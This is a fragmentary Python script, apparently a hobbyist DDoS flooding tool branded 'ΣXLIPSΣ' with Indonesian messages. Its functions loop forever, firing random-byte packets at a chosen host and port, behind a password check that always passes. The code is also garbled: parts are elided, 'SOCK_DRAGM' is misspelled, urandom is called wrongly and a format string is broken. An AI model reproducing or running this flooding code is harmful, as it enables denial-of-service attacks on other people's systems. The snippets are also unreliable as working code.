...
for i in range(3):
	...
	if(password==password):
		time.sleep(5)
		print(pink+b+"[Σ] Passwod Yang Anda Masukan Benar Tunggu 5 Detik!!!"+b+pink)
		break
	else:
		time.sleep(5)
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(bytes,addr)
			print(i +"ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[96mPort \033[91m {port}")
		except:
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}"+b+pink)

def DDoS2():
	bytes = random._urandom(580)
	pack = random._urandom(580)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DRAGM)
			s.connect((host,port))
			s.sendto(bytes,addr)
			for x in range(times):
				s.sendto(bytes)
			print(i +"ΣXLIPSΣ Send Packets To Ip Port\033[92m {}:{} ".format(host, port))
...
def DDoS4():
	bytes = random._urandom(577,102496)
	pack = random._urandom(577,102496)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
...
class MyThread(threading.Thread):
     def DDoS(self):
         while True:
                ...
                msg = Pacotes[random.randrange(4095,65534)]
